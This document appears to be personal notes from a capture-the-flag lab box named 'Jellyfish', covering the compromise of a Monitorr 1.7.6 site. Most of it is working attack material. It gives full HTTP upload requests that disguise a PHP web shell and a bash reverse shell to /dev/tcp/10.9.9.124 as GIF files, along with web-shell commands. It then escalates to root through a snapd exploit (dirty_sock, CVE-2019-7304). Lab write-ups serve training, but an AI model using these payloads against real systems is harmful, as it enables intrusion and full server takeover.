# Jellyfish

## Reconn


robyns-petshop.thm
monitorr.robyns-petshop.thm
beta.robyns-petshop.thm
dev.robyns-petshop.thm


Looking for searchsploit Monitor 1.7.6 found exploit
https://www.exploit-db.com/exploits/48980

## Payloads

POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 274

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=she_ll.gif.phtml
Content-Type: image/gif

GIF89a213213123<?php system($_GET["c"]);?>
-----------------------------31046105003900160576454225745--




POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 274

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=she_ll5.gif.phtml
Content-Type: image/gif

GIF89a213213123<?php
{php-reverse-shell.php pentestmonkey}
?> 
-----------------------------31046105003900160576454225745--



view-source:https://monitorr.robyns-petshop.thm/assets/data/usrimg/she_ll5.gif.phtml?c=ls%20-al%20/opt/ssh-honeypot

cat /opt/ssh-honeypot/README.md


# FINAL PAYLOAD 

POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 320

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=reverse.gif.pHp
Content-Type: image/gif

GIF89a213213123


<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.9.124/443 0>&1'");?> 
-----------------------------31046105003900160576454225745--


# First Access

after running Linpeas.sh in SGID section found snapd with suid
check verson snapd
: snapd --version
2.32.5

: searchsploit snapd 2.32.5
found CVE 2019-7304 
dirty_sock.py

upload exploit on target

running dirty_sock
******
user:dirty_sock
pass:dirty_sock
******

: su dirty_sock
: sudo su

root#>
